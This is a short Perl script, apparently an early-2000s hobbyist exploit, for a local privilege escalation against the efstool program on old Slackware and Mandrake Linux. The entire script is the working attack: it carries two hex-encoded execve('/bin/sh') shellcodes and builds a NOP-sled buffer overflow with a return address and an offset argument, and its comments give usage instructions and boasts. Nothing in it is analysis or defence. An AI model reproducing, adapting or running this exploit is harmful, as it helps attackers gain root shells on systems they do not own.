#!/usr/bin/perl
# efstool root exploit
# written by clorox of Ptrac Networks for BKACC(Bored Kids At ComputerCamp)
# give the campers internet grogan!
#
# tested to work on slackware 8, mandrake 8, mandrake 7.1
# tweaks may be needed on the offset
# method 1 works more often but
# method 2 is faster but not too good
#
#
# enjoy -clorox
# perl efs.pl -1000

$shellcode =
"\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89".
"\x46\x0c\x89\x76\x08\xb0\x0b\x87\xf3".
"\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29".
"\xc0\x40\xcd\x80\xe8\xde\xff\xff\xff".
"/bin/sh";

$shellcode2 =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88".
"\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3".
"\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31".
"\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff".
"\xff\xff/bin/sh";

$ret = "0xbfffe890";
$offset = $ARGV[0];
$nop = "\x90";

if ($ARGV[1] eq "m1") {
        $len = 3000;
        for ($i = 0; $i < ($len - length($shellcode)); $i++) {
                $buffer .= $nop;
        }
        $buffer .= $shellcode;
} elsif ($ARGV[1] eq "m2") {
        $len = 10010;
        for ($i = 0; $i < ($len - length($shellcode)); $i++) {
                $buffer .= $nop;
        }
        $buffer .= $shellcode2;
} else {
        print "You must specify a method fool!\n";
        print "perl $0 <offset> m1 or m2\n";
}

$buffer .= pack('l', ($ret + $offset));
$buffer .= pack('l', ($ret + $offset));
exec("efstool $buffer");
# and on the seventh day clorox said "LET THERE BE SHELL!"
